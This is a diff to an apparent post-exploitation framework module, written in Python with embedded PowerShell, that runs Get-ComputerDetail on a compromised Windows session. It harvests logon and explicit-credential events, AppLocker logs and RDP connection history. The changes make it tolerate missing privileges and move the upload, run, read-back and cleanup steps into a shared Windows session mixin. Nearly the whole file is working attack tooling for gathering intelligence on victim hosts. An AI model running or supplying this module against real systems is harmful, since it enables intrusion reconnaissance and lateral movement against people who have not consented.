@@ -2,10 +2,11 @@
 # -*- coding: utf-8 -*-
 
 from kittysploit import *
-import base64
+from lib.post.windows.session import WindowsSessionMixin
 import re
 
-class Module(Post):
+
+class Module(Post, WindowsSessionMixin):
     __info__ = {
         "name": "Windows Gather Computer Detail",
         "description": "Runs Get-ComputerDetail on a Windows shell or Meterpreter session to collect logon, PowerShell, AppLocker, and RDP client artifacts.",
@@ -90,9 +91,17 @@ function Get-ComputerDetail
         $ToString
     )
 
-    Set-StrictMode -Version 2
+    # Soft mode: Security log / HKU often deny non-admin; still return partial data
+    Set-StrictMode -Off
+    $ErrorActionPreference = 'SilentlyContinue'
 
-    $SecurityLog = Get-EventLog -LogName Security
+    $SecurityLog = @()
+    $SecurityLogNote = $null
+    try {
+        $SecurityLog = @(Get-EventLog -LogName Security -ErrorAction Stop)
+    } catch {
+        $SecurityLogNote = "[!] Security event log inaccessible (need admin / SeSecurityPrivilege): $($_.Exception.Message)"
+    }
     $Filtered4624 = Find-4624Logon $SecurityLog
     $Filtered4648 = Find-4648Logon $SecurityLog
     $AppLockerLogs = Find-AppLockerLog
@@ -101,6 +110,7 @@ function Get-ComputerDetail
 
     if ($ToString)
     {
+        if ($SecurityLogNote) { Write-Output $SecurityLogNote }
         Write-Output "Event ID 4624 (Logon):"
         Write-Output $Filtered4624.Values | Format-List
         Write-Output "Event ID 4648 (Explicit Credential Logon):"
@@ -133,7 +143,8 @@ function Find-4648Logon
         $SecurityLog
     )
 
-    $ExplicitLogons = $SecurityLog | Where-Object {$_.InstanceID -eq 4648}
+    if ($null -eq $SecurityLog) { $SecurityLog = @() }
+    $ExplicitLogons = @($SecurityLog | Where-Object { $_.InstanceID -eq 4648 })
     $ReturnInfo = @{}
 
     foreach ($ExplicitLogon in $ExplicitLogons)
@@ -230,7 +241,8 @@ function Find-4624Logon
         $SecurityLog
     )
 
-    $Logons = $SecurityLog | Where-Object {$_.InstanceID -eq 4624}
+    if ($null -eq $SecurityLog) { $SecurityLog = @() }
+    $Logons = @($SecurityLog | Where-Object { $_.InstanceID -eq 4624 })
     $ReturnInfo = @{}
 
     foreach ($Logon in $Logons)
@@ -430,9 +442,9 @@ Function Find-RDPClientConnection
 {
     $ReturnInfo = @{}
 
-    New-PSDrive -Name HKU -PSProvider Registry -Root Registry::HKEY_USERS | Out-Null
+    New-PSDrive -Name HKU -PSProvider Registry -Root Registry::HKEY_USERS -ErrorAction SilentlyContinue | Out-Null
 
-    $Users = Get-ChildItem -Path "HKU:\"
+    $Users = @(Get-ChildItem -Path "HKU:\" -ErrorAction SilentlyContinue)
     foreach ($UserSid in $Users.PSChildName)
     {
         $Servers = Get-ChildItem "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue
@@ -464,150 +476,60 @@ Function Find-RDPClientConnection
 }
 """
 
-    def _execute_cmd(self, command: str) -> str:
-        if not command:
-            return ""
-        try:
-            output = self.cmd_execute(command)
-            return output.strip() if output else ""
-        except Exception as exc:
-            raise ProcedureError(FailureType.Unknown, f"Command execution failed: {exc}")
-
-    def _encode_powershell(self, script: str) -> str:
-        return base64.b64encode(script.encode("utf-16le")).decode("ascii")
-
-    def _run_powershell(self, script: str) -> str:
-        """Run a PowerShell snippet without exceeding Windows ~8191 cmdline limit.
-
-        Polling Zig agents wrap in ``cmd.exe /c``, so large ``-EncodedCommand``
-        payloads fail with "La ligne de commande est trop longue".
-        """
-        script = (script or "").strip()
-        if not script:
-            return ""
-        esc = script.replace("'", "''")
-        command_form = f"powershell -NoP -NonI -Command '{esc}'"
-        if len(command_form) <= 7000:
-            return self._execute_cmd(command_form)
-        encoded = self._encode_powershell(script)
-        encoded_form = f"powershell -NoP -NonI -EncodedCommand {encoded}"
-        if len(encoded_form) > 7000:
-            raise ProcedureError(
-                FailureType.Unknown,
-                "PowerShell command too long for this session transport",
-            )
-        return self._execute_cmd(encoded_form)
-
-    def _remote_temp_dir(self) -> str:
-        output = self._execute_cmd("echo %TEMP%")
-        if output:
-            return output.splitlines()[0].strip().rstrip("\\")
-        return "C:\\Windows\\Temp"
-
-    def _upload_script(self, remote_path: str) -> bool:
-        """Push the full .ps1 via shell upload when available (polling/meterpreter)."""
-        import os
-        import tempfile
-        from pathlib import Path
-
-        fd, local_path = tempfile.mkstemp(prefix="ks_computer_detail_", suffix=".ps1")
-        try:
-            os.close(fd)
-            Path(local_path).write_text(self._powershell_script(), encoding="utf-8")
-            out = self.cmd_execute(f"upload {local_path} {remote_path}") or ""
-            if re.search(r"(error|failed|usage:|cannot|not found|no such)", out, re.I):
-                return False
-            if re.search(r"(ok wrote|uploaded|success|\d+\s*bytes)", out, re.I):
-                return True
-            check = self._execute_cmd(f'if exist "{remote_path}" (echo EXISTS)')
-            return "EXISTS" in (check or "").upper()
-        except Exception:
-            return False
-        finally:
-            try:
-                os.unlink(local_path)
-            except OSError:
-                pass
-
-    def _write_remote_script(self, temp_dir: str) -> tuple[str, str]:
-        script_path = f"{temp_dir}\\computer_detail.ps1"
-        blob_path = f"{temp_dir}\\computer_detail.b64"
-
-        # Prefer typed upload — avoids CreateProcess cmdline limits entirely
-        if self._upload_script(script_path):
-            print_status(f"Uploaded script to {script_path}")
-            return script_path, ""
-
-        print_status("Upload unavailable; writing script in small chunks...")
-        payload = base64.b64encode(self._powershell_script().encode("utf-8")).decode("ascii")
-        # Stay well under 8191 even with cmd.exe /c + powershell -Command wrapper
-        chunk_size = 1200
-        chunks = [payload[i : i + chunk_size] for i in range(0, len(payload), chunk_size)]
-
-        for index, chunk in enumerate(chunks):
-            chunk_esc = chunk.replace("'", "''")
-            if index == 0:
-                ps = f"[IO.File]::WriteAllText('{blob_path}','{chunk_esc}')"
-            else:
-                ps = f"[IO.File]::AppendAllText('{blob_path}','{chunk_esc}')"
-            self._run_powershell(ps)
-
-        decode_script = (
-            f"$b=[IO.File]::ReadAllText('{blob_path}');"
-            f"[IO.File]::WriteAllText('{script_path}',"
-            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"
-        )
-        self._run_powershell(decode_script)
-        return script_path, blob_path
-
-    def _collect_output(self, script_path: str, temp_dir: str, to_string: bool) -> str:
-        output_path = f"{temp_dir}\\computer_detail.out"
-        if to_string:
-            invoke = (
-                "$ProgressPreference='SilentlyContinue';"
-                f". '{script_path}';"
-                f"Get-ComputerDetail -ToString | Out-File -FilePath '{output_path}' -Width 4096 -Encoding UTF8"
-            )
-        else:
-            invoke = (
-                "$ProgressPreference='SilentlyContinue';"
-                f". '{script_path}';"
-                f"Get-ComputerDetail | ConvertTo-Json -Depth 6 | Out-File -FilePath '{output_path}' -Width 4096 -Encoding UTF8"
-            )
-
-        run_output = self._run_powershell(invoke)
-        if run_output and re.search(r"(Exception|cannot find|is not recognized|error)", run_output, re.I):
-            print_warning(run_output)
-
-        result = self._execute_cmd(f'type "{output_path}"')
-        return result
-
-    def _cleanup_remote(self, paths):
-        for path in paths:
-            if not path:
-                continue
-            self._execute_cmd(f'del /f /q "{path}"')
-
     def check(self):
-        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
-        if "1" not in ps_check:
-            print_error("PowerShell is not available on the target")
-            return False
-
-        return True
+        return self.win_require_powershell()
 
     def run(self):
         print_status("Preparing Get-ComputerDetail PowerShell payload...")
-        temp_dir = self._remote_temp_dir()
-        script_path, blob_path = self._write_remote_script(temp_dir)
+        temp_dir = self.win_remote_temp_dir()
+        script_path, blob_path = self.win_write_remote_script(
+            self._powershell_script(),
+            temp_dir,
+            "computer_detail",
+        )
         output_path = f"{temp_dir}\\computer_detail.out"
+        script_q = self.win_ps_single_quote(script_path)
+        out_q = self.win_ps_single_quote(output_path)
 
         print_status("Running Get-ComputerDetail on the target...")
-        result = self._collect_output(script_path, temp_dir, self.to_string)
+        # Always write something to the out file (partial results / privilege notes)
+        if self.to_string:
+            body = (
+                f"$r = Get-ComputerDetail -ToString | Out-String;"
+                f"if (-not $r) {{ $r = 'Get-ComputerDetail: no data (check privileges for Security log / HKU).' }};"
+                f"$r | Out-File -FilePath '{out_q}' -Width 4096 -Encoding UTF8"
+            )
+        else:
+            body = (
+                f"$r = Get-ComputerDetail | ConvertTo-Json -Depth 6;"
+                f"if (-not $r) {{ $r = '{{}}' }};"
+                f"$r | Out-File -FilePath '{out_q}' -Width 4096 -Encoding UTF8"
+            )
+        invoke = (
+            "$ProgressPreference='SilentlyContinue';$ErrorActionPreference='Continue';"
+            f". '{script_q}';"
+            "try { "
+            + body
+            + " } catch { $_ | Out-File -FilePath '"
+            + out_q
+            + "' -Width 4096 -Encoding UTF8 }"
+        )
+        run_output = self.win_run_powershell(invoke, timeout=120)
+        if run_output and re.search(
+            r"(Exception|cannot find|is not recognized|error|inaccessible|denied)",
+            run_output,
+            re.I,
+        ):
+            print_warning(run_output)
+
+        result = (self.win_read_remote_text(output_path, timeout=60) or "").strip()
+        # Fallback: some hosts only return pipeline text and never create the file
+        if not result and run_output and "<Objs " not in run_output:
+            result = run_output.strip()
 
         if self.cleanup:
             print_status("Cleaning up temporary artifacts...")
-            self._cleanup_remote([script_path, blob_path, output_path])
+            self.win_delete_remote([script_path, blob_path, output_path])
 
         if not result:
             raise ProcedureError(
